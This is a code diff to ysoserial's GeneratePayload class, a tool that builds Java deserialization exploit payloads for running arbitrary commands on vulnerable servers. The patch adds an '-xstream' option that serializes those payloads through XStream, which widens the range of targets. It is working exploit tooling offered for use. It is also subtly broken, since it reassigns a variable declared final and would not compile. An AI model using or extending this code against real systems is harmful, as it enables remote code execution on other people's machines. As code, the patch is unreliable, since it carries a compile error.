@@ -21,6 +21,11 @@ public class GeneratePayload {
 		}
 		final String payloadType = args[0];
 		final String[] command = Arrays.copyOfRange(args, 1, args.length);
+		final boolean xstreamDeserialization = (Arrays.asList(args).contains("-xstream"));
+		if(xstreamDeserialization){
+				command = ArrayUtils.removeElement(command, "-xstream");
+		}
+
 
 		final Class<? extends ObjectPayload> payloadClass = Utils.getPayloadClass(payloadType);
 		if (payloadClass == null) {
@@ -43,9 +48,15 @@ public class GeneratePayload {
 				}
 				object = payload.getObject(command[0]);
 			}
-			
+
 			PrintStream out = System.out;
-			Serializer.serialize(object, out);
+
+			if(xstreamDeserialization){
+			    Serializer.serializeXstream(object, out);
+            }else{
+                Serializer.serialize(object, out);
+            }
+
 			ObjectPayload.Utils.releasePayload(payload, object);
 		} catch (Throwable e) {
 			System.err.println("Error while generating or serializing payload");
@@ -57,7 +68,7 @@ public class GeneratePayload {
 
 	private static void printUsage() {
 		System.err.println("Y SO SERIAL?");
-		System.err.println("Usage: java -jar ysoserial-[version]-all.jar payload  [arguments ...]");
+		System.err.println("Usage: java -jar ysoserial-[version]-all.jar [payload] '[command]' [-xstream]");
 		System.err.println("  Available payload types:");
 
 		final List<Class<? extends ObjectPayload>> payloadClasses =
